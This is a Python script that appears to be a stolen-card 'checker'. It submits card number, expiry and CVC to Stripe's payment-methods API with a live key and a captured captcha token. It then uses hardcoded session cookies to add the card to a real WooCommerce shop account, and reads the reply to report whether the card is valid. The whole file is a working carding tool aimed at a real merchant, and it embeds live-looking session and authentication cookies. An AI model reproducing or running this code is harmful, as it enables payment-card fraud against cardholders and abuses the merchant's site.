import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'tr-TR,tr;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[name]=+&billing_details[email]=deneme1737zs%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=000069c5-1a77-4113-bf29-b9d067e766a28b47da&muid=2450f25a-3ac5-40ed-a35f-776d438c4175813bd8&sid=1c2d8365-06a7-4c33-aa50-a0a2eb322a28bfac11&payment_user_agent=stripe.js%2F1f0095e58d%3B+stripe-js-v3%2F1f0095e58d%3B+split-card-element&referrer=https%3A%2F%2Fwww.eptes.com&time_on_page=69181&key=pk_live_iAOnl6krzsQGcNieoEv29cT000AEEWPhfH&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoia1djeTlzS2xqMUg0ZTIrSzZwbVJ6d0loRm5uY0U1M3hZWFVWQkVHRStJalRaVXV0Z2NKNEovYngveTZ0dkM3VnEyT2ZLaU5uZmFaQ1p6TnQyU1hjaFgybEtQS3dIZ1czaVhjWllDdSs3MlRDaFlHNWovL29zTE9yTzJkc2J2dTZBQ3Z1SC9yRmZWR2h3Ump4ZE9xVHpQSWF6ZWVnd0xnQmtja3IzUGZsMFhFNUZ3Q0ozbkNldHJGbEIzeEp1VXhvQmNXdHNlY3UvWnRUMnNmS1laYXdqRitBQVhDelUvbzB5ODg5NmVHQ2xuUWJUNjRoRkRTY00rNkRqNDlERnp4OS9EUWRReXpObVRsQXQ1dnRualVoS05kVDZmb1ZHclB1UVZtK2Y5b3VOWFEyT0RHMzl6V2VWekY1VkJNUC9WRWxycWZnZTdhMXZyeWZIZUNtM1ZOektpY0ZuSHN0TE1HQXczcGVObDhyRGhVYjJxSzU4dm81TzA5UHRaeTdsdTM1bzJSbUVSbUxwaHB3K3UyKzJ4Si9ERkFQVFlsdXJqWmhidmxpYkIzNUpqNGF5QnFQdHBqcDZPZDJFU3pkcVNoTVJON0hya0QvR2pRWW14WkxVQTlRdGNGdVVWVmFoN2FjVEE0SHZ4MzZjZFJhSm1jM2NLUWJvaXlxQ0hWZW9zVEtJd1JWTnZOQTV4OUxrRVd5ZWJpeDIwSU9uM0FJbWxER2VUWHBodjlyc1R3SnJRVU82V1BUUE53MTFadXdRYllMTjN2VTVCRlRlVFNtM1dHY0FZT3Z4eGtYNFo0S1ZWM2hIZGJzdXYwTlBnYXBqb215a2dmNURBR1NQTCtDRDMvbUVoVkFnSzBxWFp2OEdaSW5SWm9SLzYxZWYzcmRmcUk5c2lTNTdVZ2krQnkxblY3aXBLaTFIT0o1aUNWaGE4bjFQWmdObTY4dVduN1hOM01jRjl0TW1MdFlFWmpPQldESlYzUllZOFp6VEZLQ0NKeGIyemVTbzBmMTVOTUpvUHRWTzNDdjRla2tzTTlIUFpac2hzdGFqSUhNaEU5QWxvcWx3NnE0Tk9mZFVsMnVPSW4wRXUzS21uRXUraTN2NklteEMyd0RST2VJRGx2bkR4N0dUUDlqN0VSOGpOeWJXU3BFR2xWeE9RQmZyRGl3d2U1eGNxRE5sWlNQZ3JoV0lKTTdLQlI3bUhXOEsrWGRCQ2Rnd01rZE5hQUhpcmJ2U2hhc1hUcnc1a29DeVZ6eVdQdUNFbkMvVm1WMVEycUxzeXF3dTZSZlJXVi9sZnVGeFA3WFJnNGRtZ0ZxMEJpNXdTalZ5NTVlak1DU0VmdlAzazhObGtrVlJpRllDNytaZnRuQzBqc0ZEM2VnaFE3RFM5V1BRcVpuQ3VkVkFiVmMyZmNhY2l2RVRMV0tlWmxSUzQ5VFR5L3NoUk1OenduaWFVMnZwNk5oaEJMMUU0VEhlT3FnNlBRRHlTdHNtNWNLMlV1aTlaUGo5aXpWbDdaZzU4OGxBS0dkMi9oc3RVWC8wclVWdlN6bEFFK0tFRDJ3QVBOcVdSblhPS0h6RUovTXA1bUl0SG5OSmI0VzE3dWo4MjFvZXNhMDNYam9FWEFNd0VjTWRSTGVVM1VyaXFoVmd4OUFjN2ZzZHZZV0tId2YxaStBR21FaEtLY0NDSko4citNOTcwK0NETkFuK3FsdlMraFpreFgyTXZCTWdzUklYQytVSHpteHFFR1d5TmlyZFhBVFgvbEFHajJqR2FINTI2bFBuNXhwZDI2OEViVEpGb1hyblZBMnJUMkE5endvczFKcGN2VkpXUG1CYjk5OTY0NXQ2NG1xb0FHZUJRb2h1UXAxdHlsbGl1TFlCZGZrWWI1bWJ3ZjhrK2g4aU1uM3EyUWw4OWVrR3k3L242SGJQWkc1VjkxUGp5Nmt4NmhjU01BWjlKaUd5YjRROVpGQ01RcWxqbmhBeWFob1dsQURmbTBnckdjQ2lJM3ZNc3kyNTc4emZrWVpzaXVpQWlOTWswWG04ZGdHbXhVWXpnSmJGQzRyTzhtSkVmMjFza1RuNmx4dVhHUG9PUlYwbGtCUVUyTTRhOXhkbXUvR1YzdFhmZHF6cE1LUWpnWlZyeXpWU2lTbDRPczRsSWNjS2pYVGxVS0VRTkM0cGMydEcvQXR5RVdzeHN5S1MyYksxRmI5VVp2UXZmMEhiYXorWjRaR3J6K0FvdThveUU5OFFWT05zbExncGlXcU5UVDZsLzRNU2wzV0NwNVo5YStlczR2eXAxZFArZUhKWkRaUTVIc0Z6TWFVS0VhUGtUcDdINzJpMmVXR1RkRUxrcUhqQlJWdUFZYXBSbkVwV0Nxb2REM2hFd0RlRTZNbG9seTdWM0xOSUhRdWtOdmc4SHp2bzhYQzEyVDZNd3M3ME9YM1hMQS8zdXF0WjBLaXBZQysvYkdxR2FlelJNbHU4YUNlWElKaEZNMld5cWoxYVVyNDArR1FDWTd2ckZ4Wm1WWkxQeU5iRWFzVFZ0bWFXVjJrZlArUmUrTGdaTmNNMmlEcWQ3TFpEQ1VZMVJDMVU3aG1PZlVabUx2QnlzcEFySUhtOUJBUjJIcWNtUXU4RlZON0hUZVFTSjV2TXpkaWRNTWZQTDlEV0xTZDFlVkppcEI0RHF5Z3J3S2lRL1ZwekJiNFA3OXlSeWxmSUQzOSttZDZnYXJaUS9IYzVBSzYyZ2dWV0p3TVI4RTg4bW9TZExRU1I1YW83dTA2YTl3M1JrNzFtK3Y5Q05mb2U4aER5NW5Cd3hSOTJ0SkxZaHYwWFFNVlI5YUVpeGFBcitpTk84VXJkUkpPa2Z5dFQwdnk2Q0s2cVByK3NJOGxpaXJlUTBUdnBodnczRkJRNXkrK3dlSUNvby9Zcms5VHNBPT0iLCJleHAiOjE3NDMyMDc4ODAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiNjQ3NTQ5ZCIsInBkIjowLCJjZGF0YSI6InJFQzdTcW5lb002S3g3V0xOaFhaTmErOUtwbnlsTWFpQ2hWQVFKS2xKTytHTkVVaUErYytzTnhNZTNoenFncThwT1hxQzZVUXNlb3dFa01sRGU0cUZoSnFmYklKR3NhYmJLd1MyUWtibFdoajl5RjFqRDdtVGZIRXhMVHhzUUQ2dk1INlV5RTdCMVF5MzBrY000TFRuUGt0T3B5V1J4WXU2VUgxT0dOR2p4V1hXaFM5YUFYQjgwMHhWSXhFcjZXV3ZVQU0rQWE2UnlseXZrbWoifQ.vkvtVfjNSKW0Ds7FvIzTdcyQVVWxP7CPxxX9s4c-5uo'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	import requests
	
	import requests
	
	cookies = {
	    '__stripe_mid': '2450f25a-3ac5-40ed-a35f-776d438c4175813bd8',
	    '__stripe_sid': '1c2d8365-06a7-4c33-aa50-a0a2eb322a28bfac11',
	    'cookieyes-consent': 'consentid:WHJ3RjNkdW1kemgyV3BadWJzQzFFNllvMGNaSzBNNG4,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    'wordpress_logged_in_07098fb18dc3b67462b5facdb919520d': 'deneme1737zs%7C1744417335%7C5A5oI5AO3QBUB9LXvJ1i2JP4LgldwLapQlTSAC6w3rn%7C408821eaa81d1be8ad63dd793b931de6f288ba3275228b1e429ef3c91885754a',
	    'wp-wpml_current_language': 'en',
	    'wfwaf-authcookie-e53b18bfa68549e888f418ac319fce7a': '24698%7Cother%7Cread%7Ce5844f1dd9e42148fbd28df740daad0d152ed95c6a8598deb3fa0e9cd02c1a0b',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-03-29%2000%3A22%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    'sbjs_first_add': 'fd%3D2025-03-29%2000%3A22%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'www.eptes.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'tr-TR,tr;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=2450f25a-3ac5-40ed-a35f-776d438c4175813bd8; __stripe_sid=1c2d8365-06a7-4c33-aa50-a0a2eb322a28bfac11; cookieyes-consent=consentid:WHJ3RjNkdW1kemgyV3BadWJzQzFFNllvMGNaSzBNNG4,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; wordpress_logged_in_07098fb18dc3b67462b5facdb919520d=deneme1737zs%7C1744417335%7C5A5oI5AO3QBUB9LXvJ1i2JP4LgldwLapQlTSAC6w3rn%7C408821eaa81d1be8ad63dd793b931de6f288ba3275228b1e429ef3c91885754a; wp-wpml_current_language=en; wfwaf-authcookie-e53b18bfa68549e888f418ac319fce7a=24698%7Cother%7Cread%7Ce5844f1dd9e42148fbd28df740daad0d152ed95c6a8598deb3fa0e9cd02c1a0b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-29%2000%3A22%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-03-29%2000%3A22%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.eptes.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    'origin': 'https://www.eptes.com',
	    'referer': 'https://www.eptes.com/my-account-2/add-payment-method/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': '402df536df',
	}
	
	response = requests.post('https://www.eptes.com/', params=params, cookies=cookies, headers=headers, data=data)

	text=(response.text)
	import re
	pattern = r'<div class="woocommerce-message".*?>(.*?)</div>'
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Payment method successfully added.' in text:
			return 'success'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print("Your card was declined.")
			return "Your card was declined."